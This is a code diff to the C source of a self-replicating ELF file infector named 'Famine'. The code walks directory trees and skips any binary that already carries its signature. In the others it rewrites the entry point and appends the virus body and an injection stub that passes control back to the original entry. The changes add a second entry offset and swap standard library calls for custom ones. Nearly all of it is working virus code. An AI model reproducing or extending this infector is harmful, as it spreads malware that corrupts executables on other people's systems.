@@ -11,46 +11,49 @@ int			get_size_needed(t_elf *elf, t_elf *virus_elf)
 	return (diff);
 }
 
-void	add_injection(void **dst, t_elf *elf, uint64_t offset_inject)
+void	add_injection(void **dst, t_elf *elf, uint64_t offset_inject, uint64_t entry_infect)
 {
 
-	memcpy(*dst, INJECT, INJECT_SIZE - (sizeof(uint64_t) * 3));
-	*dst += INJECT_SIZE - (sizeof(uint64_t) * 3);
-	memcpy(*dst + sizeof(uint64_t) * 0, &elf->pt_load->p_vaddr, sizeof(uint64_t));
-	memcpy(*dst + sizeof(uint64_t) * 1, &offset_inject, sizeof(uint64_t));
-	memcpy(*dst + sizeof(uint64_t) * 2, &elf->header->e_entry, sizeof(uint64_t));
-	*dst += sizeof(uint64_t) * 3;
+	ft_memcpy(*dst, INJECT, INJECT_SIZE - (sizeof(uint64_t) * 4));
+	*dst += INJECT_SIZE - (sizeof(uint64_t) * 4);
+	ft_memcpy(*dst + sizeof(uint64_t) * 0, &elf->pt_load->p_vaddr, sizeof(uint64_t));
+	ft_memcpy(*dst + sizeof(uint64_t) * 1, &offset_inject, sizeof(uint64_t));
+	ft_memcpy(*dst + sizeof(uint64_t) * 2, &elf->header->e_entry, sizeof(uint64_t));
+	ft_memcpy(*dst + sizeof(uint64_t) * 3, &entry_infect, sizeof(uint64_t));
+	*dst += sizeof(uint64_t) * 4;
 }
 
 void	create_infection(void *dst, t_elf *elf, t_elf *virus_elf, int nb_zero)
 {
 	uint64_t	new_entry;
+	uint64_t	entry_infect;
 	void		*src;
 	void		*end;
 
 	src = elf->addr;
 	end = src + elf->size;
-	memcpy(dst, src, (unsigned long)&elf->header->e_entry - (unsigned long)src);
+	ft_memcpy(dst, src, (unsigned long)&elf->header->e_entry - (unsigned long)src);
 	dst += (unsigned long)&elf->header->e_entry - (unsigned long)src;
 	src = &elf->header->e_entry;
 	new_entry = elf->pt_load->p_offset + elf->pt_load->p_filesz + virus_elf->size;
-	memcpy(dst, &new_entry, sizeof(elf->header->e_entry));
+	entry_infect = elf->pt_load->p_offset + elf->pt_load->p_filesz + (virus_elf->header->e_entry - virus_elf->pt_load->p_vaddr);
+	ft_memcpy(dst, &new_entry, sizeof(elf->header->e_entry));
 	dst += sizeof(elf->header->e_entry);
 	src += sizeof(elf->header->e_entry);
 	src = add_padding_segments(elf, virus_elf, src, &dst, nb_zero);
 	int pt_load_size_left = ((unsigned long)elf->addr + elf->pt_load->p_offset + elf->pt_load->p_filesz) - (unsigned long)src;
-	memcpy(dst, src, pt_load_size_left);
+	ft_memcpy(dst, src, pt_load_size_left);
 	dst += pt_load_size_left;
 	src += pt_load_size_left;
-	memcpy(dst, virus_elf->addr, virus_elf->size);
+	ft_memcpy(dst, virus_elf->addr, virus_elf->size);
 	dst += virus_elf->size;
-	add_injection(&dst, elf, new_entry);
-	memset(dst, 0, nb_zero);
+	add_injection(&dst, elf, new_entry, entry_infect);
+	ft_memset(dst, 0, nb_zero);
 	dst += nb_zero;
 	// TODO: fix for thin files like inject
 	src += (virus_elf->size + INJECT_SIZE) - get_size_needed(elf, virus_elf);
 	src = add_padding_sections(elf, virus_elf, src, &dst, nb_zero);
-	memcpy(dst, src, (unsigned long)end - (unsigned long)src);
+	ft_memcpy(dst, src, (unsigned long)end - (unsigned long)src);
 }
 
 void	try_open_file(t_elf *virus_elf, char *file)
@@ -80,7 +83,7 @@ void	try_open_file(t_elf *virus_elf, char *file)
 						debug_print_error(0, virus_elf->filename, file);
 					return ;
 				}
-				if (!memmem(elf.addr, elf.size, SIGNATURE, strlen(SIGNATURE)))
+				if (!memmem(elf.addr, elf.size, SIGNATURE, ft_strlen(SIGNATURE)))
 				{
 					if ((ret = init_elf(&elf, elf.addr, elf.size)) < 0)
 					{
@@ -141,9 +144,9 @@ void	moving_through_path(t_elf *virus_elf, char *path)
 	{
 		while ((d = readdir(dir)))
 		{
-			if (strcmp(d->d_name, ".") && strcmp(d->d_name, ".."))
+			if (ft_strcmp(d->d_name, ".") && ft_strcmp(d->d_name, ".."))
 			{
-				size = strlen(path) + strlen(d->d_name) + 2;
+				size = ft_strlen(path) + ft_strlen(d->d_name) + 2;
 				new_path = malloc(size);
 				bzero(new_path, size);
 				strcpy(new_path, path);
@@ -177,7 +180,7 @@ int		main(int argc, char *argv[])
 		/* TODO: Original infection
 			Copy the whole file
 		*/
-		if (!strcmp(basename(argv[0]), "Famine"))
+		if (!ft_strcmp(basename(argv[0]), "Famine"))
 		{
 			elf.filename = argv[0];
 			elf.size = lseek(fd, (size_t)0, SEEK_END);
@@ -208,5 +211,6 @@ int		main(int argc, char *argv[])
 	}
 	else if (DEBUG)
 		debug_print_error(0, argv[0], argv[0]);
+	exit(0);
 	return (0);
 }
